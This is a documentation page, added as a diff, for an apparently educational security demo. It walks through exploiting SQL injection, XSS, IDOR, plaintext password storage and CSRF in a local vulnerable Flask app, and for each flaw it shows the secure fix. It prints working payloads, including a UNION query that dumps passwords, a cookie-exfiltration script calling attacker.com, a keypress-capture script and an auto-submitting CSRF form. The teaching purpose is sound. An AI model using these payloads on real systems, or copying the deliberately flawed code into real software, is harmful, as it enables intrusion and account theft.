@@ -1,0 +1,582 @@
+---
+title: Testing Vulnerabilities
+description: Step-by-step guide to testing each security vulnerability in the demo
+icon: bug
+---
+
+## Overview
+
+This guide provides hands-on instructions for testing each vulnerability in the Auth Security Demo. Each test includes:
+
+- Vulnerability description and severity
+- Step-by-step exploitation instructions
+- Expected results
+- Comparison with secure implementation
+
+<Warning>
+  **Ethical Use Only**: These techniques are for educational purposes in controlled environments. Unauthorized testing on production systems is illegal.
+</Warning>
+
+---
+
+## Testing Environment
+
+Before testing, ensure both applications are running:
+
+```bash
+# Terminal 1: Vulnerable app
+cd vulnerable && python3 app.py
+
+# Terminal 2: Secure app
+cd secure && python3 app.py
+```
+
+<CardGroup cols={2}>
+  <Card title="Vulnerable App" icon="unlock" color="#ef4444">
+    http://localhost:5000
+  </Card>
+  <Card title="Secure App" icon="lock" color="#22c55e">
+    http://localhost:5001
+  </Card>
+</CardGroup>
+
+---
+
+## Vulnerability #1: SQL Injection
+
+<Info>
+  **Severity**: Critical (CVSS 9.8) | **CWE**: CWE-89
+</Info>
+
+### What is SQL Injection?
+
+SQL Injection occurs when user input is directly concatenated into SQL queries without sanitization, allowing attackers to execute arbitrary database commands.
+
+### Vulnerable Code Location
+
+`vulnerable/app.py:26`
+
+```python
+# VULNERABLE: String concatenation
+query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+cursor.execute(query)
+```
+
+### Testing SQL Injection
+
+<Tabs>
+  <Tab title="Method 1: Authentication Bypass">
+    <Steps>
+      <Step title="Navigate to vulnerable login">
+        Open http://localhost:5000/login in your browser
+      </Step>
+
+      <Step title="Enter malicious payload">
+        Use these credentials:
+
+        **Username:**
+        ```
+        admin
+        ```
+
+        **Password:**
+        ```
+        x' OR '1'='1
+        ```
+
+        <Info>
+          This payload closes the password string and adds a condition that's always true.
+        </Info>
+      </Step>
+
+      <Step title="Observe the result">
+        ✅ **Success indicators:**
+        - You're logged in as admin without knowing the real password
+        - Redirected to `/dashboard`
+        - Session shows admin privileges
+
+        Check the terminal logs to see the executed query:
+        ```
+        Query ejecutada: SELECT * FROM users WHERE username = 'admin' AND password = 'x' OR '1'='1'
+        ```
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Method 2: Comment Injection">
+    <Steps>
+      <Step title="Use SQL comment syntax">
+        **Username:**
+        ```
+        admin' --
+        ```
+
+        **Password:**
+        ```
+        (anything)
+        ```
+
+        <Warning>
+          Note the space after `--` - it's required for SQL comments to work.
+        </Warning>
+      </Step>
+
+      <Step title="Understand the exploit">
+        The query becomes:
+        ```sql
+        SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'
+        ```
+
+        Everything after `--` is treated as a comment, ignoring the password check.
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Method 3: UNION-based Injection">
+    <Steps>
+      <Step title="Extract data with UNION">
+        **Username:**
+        ```
+        ' UNION SELECT 1,2,3,4,5,6 --
+        ```
+
+        **Password:**
+        ```
+        x
+        ```
+      </Step>
+
+      <Step title="Enumerate database">
+        Advanced payload to extract all users:
+        ```
+        ' UNION SELECT id, username, password, email, role, created_at FROM users --
+        ```
+
+        This reveals all database records including passwords.
+      </Step>
+    </Steps>
+  </Tab>
+</Tabs>
+
+### Test on Secure Version
+
+Try the same payloads on http://localhost:5001/login:
+
+```python
+# SECURE: Parameterized query (secure/app.py:55)
+query = "SELECT * FROM users WHERE username = %s"
+cursor.execute(query, (username,))
+```
+
+❌ **Expected result**: "Credenciales incorrectas" - The payloads are treated as literal strings.
+
+---
+
+## Vulnerability #2: Cross-Site Scripting (XSS)
+
+<Info>
+  **Severity**: High (CVSS 7.5) | **CWE**: CWE-79
+</Info>
+
+### What is XSS?
+
+XSS allows attackers to inject malicious JavaScript that executes in victims' browsers, potentially stealing cookies, sessions, or performing actions on their behalf.
+
+### Vulnerable Code Location
+
+`vulnerable/app.py:82-86`
+
+```python
+# VULNERABLE: Unescaped output
+message = request.args.get('message', '')
+return render_template('dashboard.html', message=message)
+```
+
+### Testing XSS
+
+<Tabs>
+  <Tab title="Reflected XSS">
+    <Steps>
+      <Step title="Login to vulnerable app">
+        First, authenticate:
+        - Username: `admin`
+        - Password: `admin123`
+      </Step>
+
+      <Step title="Inject XSS payload">
+        Navigate to this URL (or paste in browser):
+
+        ```
+        http://localhost:5000/dashboard?message=<script>alert('XSS')</script>
+        ```
+      </Step>
+
+      <Step title="Observe JavaScript execution">
+        ✅ **Success indicators:**
+        - Alert popup appears with "XSS"
+        - JavaScript code executed in browser context
+        - View page source to see unescaped script tag
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Cookie Stealing">
+    <Steps>
+      <Step title="Steal session cookie">
+        Use this payload to display the session cookie:
+
+        ```
+        http://localhost:5000/dashboard?message=<script>alert(document.cookie)</script>
+        ```
+
+        The alert shows the Flask session cookie containing user data.
+      </Step>
+
+      <Step title="Exfiltrate to attacker server (simulated)">
+        In a real attack:
+        ```html
+        <script>fetch('http://attacker.com?cookie='+document.cookie)</script>
+        ```
+
+        <Warning>
+          This demonstrates why XSS is dangerous - attackers can steal authenticated sessions.
+        </Warning>
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="DOM Manipulation">
+    <Steps>
+      <Step title="Modify page content">
+        ```
+        http://localhost:5000/dashboard?message=<script>document.body.innerHTML='<h1>HACKED</h1>'</script>
+        ```
+
+        The entire page content is replaced.
+      </Step>
+
+      <Step title="Image-based XSS">
+        ```
+        http://localhost:5000/dashboard?message=<img src=x onerror="alert('XSS')">
+        ```
+
+        This works even with some basic XSS filters.
+      </Step>
+
+      <Step title="Keylogger (educational)">
+        ```
+        http://localhost:5000/dashboard?message=<script>document.onkeypress=function(e){alert('Key: '+e.key)}</script>
+        ```
+
+        Demonstrates how XSS can capture user input.
+      </Step>
+    </Steps>
+  </Tab>
+</Tabs>
+
+### Test on Secure Version
+
+Try the same payloads on http://localhost:5001/dashboard:
+
+```python
+# SECURE: HTML escaping (secure/app.py:132-136)
+from markupsafe import escape
+message = request.args.get('message', '')
+return render_template('dashboard.html', message=escape(message))
+```
+
+❌ **Expected result**: The script tags are displayed as text, not executed.
+
+Example:
+```html
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+```
+
+---
+
+## Vulnerability #3: Insecure Direct Object Reference (IDOR)
+
+<Info>
+  **Severity**: Medium (CVSS 6.5) | **CWE**: CWE-639
+</Info>
+
+### What is IDOR?
+
+IDOR occurs when an application exposes direct references to internal objects (like user IDs) without proper authorization checks, allowing users to access others' data.
+
+### Vulnerable Code Location
+
+`vulnerable/app.py:95-101`
+
+```python
+# VULNERABLE: No authorization check
+user_id = request.args.get('id', session['user_id'])
+cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
+```
+
+### Testing IDOR
+
+<Tabs>
+  <Tab title="Access Other Users' Profiles">
+    <Steps>
+      <Step title="Login as regular user">
+        - Username: `usuario`
+        - Password: `password123`
+        
+        Navigate to http://localhost:5000/profile
+      </Step>
+
+      <Step title="Note your user ID">
+        Your profile URL might be:
+        ```
+        http://localhost:5000/profile?id=2
+        ```
+      </Step>
+
+      <Step title="Access admin profile">
+        Change the ID parameter:
+        ```
+        http://localhost:5000/profile?id=1
+        ```
+
+        ✅ **Success**: You can view the admin's profile including email and role.
+      </Step>
+
+      <Step title="Enumerate all users">
+        Try different IDs:
+        ```
+        http://localhost:5000/profile?id=1
+        http://localhost:5000/profile?id=2
+        http://localhost:5000/profile?id=3
+        ```
+
+        You can view any user's data without authorization.
+      </Step>
+    </Steps>
+  </Tab>
+
+  <Tab title="Automated Enumeration">
+    Use curl to enumerate users:
+
+    ```bash
+    # Get session cookie first
+    curl -c cookies.txt -X POST http://localhost:5000/login \
+      -d "username=usuario&password=password123"
+    
+    # Enumerate user IDs 1-10
+    for i in {1..10}; do
+      echo "=== User ID $i ==="
+      curl -b cookies.txt "http://localhost:5000/profile?id=$i"
+    done
+    ```
+  </Tab>
+</Tabs>
+
+### Test on Secure Version
+
+Try the same on http://localhost:5001/profile:
+
+```python
+# SECURE: Authorization check (secure/app.py:146-158)
+requested_id = int(requested_id)
+if requested_id != session['user_id'] and session.get('role') != 'admin':
+    flash('No tienes permiso para ver este perfil', 'danger')
+    return redirect('/dashboard')
+```
+
+❌ **Expected result**: "No tienes permiso para ver este perfil" - Access denied unless you're viewing your own profile or you're an admin.
+
+---
+
+## Vulnerability #4: Insecure Password Storage
+
+<Info>
+  **Severity**: Critical (CVSS 9.1) | **CWE**: CWE-256
+</Info>
+
+### What is the Issue?
+
+Passwords stored in plain text can be immediately used if the database is compromised through SQL injection or other means.
+
+### Comparing Password Storage
+
+<CodeGroup>
+```python vulnerable/database.py
+# VULNERABLE: Plain text passwords
+cursor.execute("""
+    INSERT INTO users (username, password, email, role) 
+    VALUES (?, ?, ?, ?)
+""", ('admin', 'admin123', 'admin@test.com', 'admin'))
+```
+
+```python secure/database.py
+# SECURE: Hashed passwords with bcrypt
+from werkzeug.security import generate_password_hash
+admin_password = generate_password_hash('admin123')
+cursor.execute("""
+    INSERT INTO users (username, password, email, role) 
+    VALUES (?, ?, ?, ?)
+""", ('admin', admin_password, 'admin@test.com', 'admin'))
+```
+</CodeGroup>
+
+### Testing Password Storage
+
+<Steps>
+  <Step title="Extract passwords via SQL injection">
+    Using the SQL injection technique, extract passwords:
+
+    **Payload:**
+    ```
+    ' UNION SELECT id, username, password, email, role, created_at FROM users --
+    ```
+
+    On vulnerable app: Passwords are visible as `admin123`, `password123`
+  </Step>
+
+  <Step title="Direct database inspection">
+    ```bash
+    # View vulnerable database
+    sqlite3 vulnerable/users.db "SELECT username, password FROM users"
+    ```
+
+    Output:
+    ```
+    admin|admin123
+    usuario|password123
+    ```
+  </Step>
+
+  <Step title="Compare with secure database">
+    ```bash
+    # View secure database
+    sqlite3 secure/users.db "SELECT username, password FROM users"
+    ```
+
+    Output:
+    ```
+    admin|scrypt:32768:8:1$abc123...
+    usuario|scrypt:32768:8:1$def456...
+    ```
+
+    ✅ **Secure**: Passwords are hashed and cannot be reversed.
+  </Step>
+</Steps>
+
+---
+
+## Vulnerability #5: Missing CSRF Protection
+
+<Info>
+  **Severity**: Medium (CVSS 6.5) | **CWE**: CWE-352
+</Info>
+
+### What is CSRF?
+
+Cross-Site Request Forgery tricks authenticated users into submitting malicious requests without their knowledge.
+
+### Testing CSRF
+
+<Steps>
+  <Step title="Create malicious HTML page">
+    Create a file `csrf-attack.html`:
+
+    ```html
+    <!DOCTYPE html>
+    <html>
+    <body>
+      <h1>Click here for free prize!</h1>
+      <form action="http://localhost:5000/register" method="POST" id="attack">
+        <input type="hidden" name="username" value="hacker">
+        <input type="hidden" name="password" value="hacked123">
+        <input type="hidden" name="email" value="hacker@evil.com">
+      </form>
+      <script>document.getElementById('attack').submit();</script>
+    </body>
+    </html>
+    ```
+  </Step>
+
+  <Step title="Test on vulnerable app">
+    1. Login to http://localhost:5000
+    2. Open `csrf-attack.html` in the same browser
+    3. The form auto-submits and creates a user
+
+    ✅ **Vulnerable**: New user created without user consent.
+  </Step>
+
+  <Step title="Test on secure app">
+    Try the same attack on http://localhost:5001
+
+    ❌ **Protected**: Flask-WTF blocks the request due to missing CSRF token.
+
+    Error: "400 Bad Request: The CSRF token is missing"
+  </Step>
+</Steps>
+
+---
+
+## Testing Checklist
+
+<AccordionGroup>
+  <Accordion title="SQL Injection Tests">
+    - [ ] Authentication bypass with `' OR '1'='1`
+    - [ ] Comment injection with `admin' --`
+    - [ ] UNION-based data extraction
+    - [ ] Error-based SQL injection
+    - [ ] Verify secure app blocks all attempts
+  </Accordion>
+
+  <Accordion title="XSS Tests">
+    - [ ] Basic alert payload `<script>alert('XSS')</script>`
+    - [ ] Cookie theft via `document.cookie`
+    - [ ] DOM manipulation
+    - [ ] Image-based XSS with `onerror`
+    - [ ] Verify secure app escapes all HTML
+  </Accordion>
+
+  <Accordion title="IDOR Tests">
+    - [ ] Access other users' profiles by changing ID
+    - [ ] Enumerate all user IDs
+    - [ ] Try accessing admin profile as regular user
+    - [ ] Verify secure app enforces authorization
+  </Accordion>
+
+  <Accordion title="Password Storage Tests">
+    - [ ] Extract passwords via SQL injection
+    - [ ] Inspect database directly
+    - [ ] Verify vulnerable app stores plain text
+    - [ ] Verify secure app uses bcrypt hashes
+  </Accordion>
+
+  <Accordion title="CSRF Tests">
+    - [ ] Create malicious form
+    - [ ] Test auto-submission on vulnerable app
+    - [ ] Verify secure app requires CSRF token
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Impact Summary
+
+| Vulnerability | Vulnerable App | Secure App | Impact |
+|---------------|---------------|------------|--------|
+| SQL Injection | ✅ Exploitable | ❌ Protected | Full database access |
+| XSS | ✅ Exploitable | ❌ Protected | Session theft, defacement |
+| IDOR | ✅ Exploitable | ❌ Protected | Unauthorized data access |
+| Plain Text Passwords | ✅ Present | ❌ Hashed | Credential compromise |
+| CSRF | ✅ Exploitable | ❌ Protected | Unauthorized actions |
+
+---
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Troubleshooting" icon="wrench" href="/setup/troubleshooting">
+    Fix issues encountered during testing
+  </Card>
+  <Card title="Vulnerability Details" icon="shield" href="/vulnerabilities/sql-injection">
+    Learn more about each vulnerability
+  </Card>
+</CardGroup>
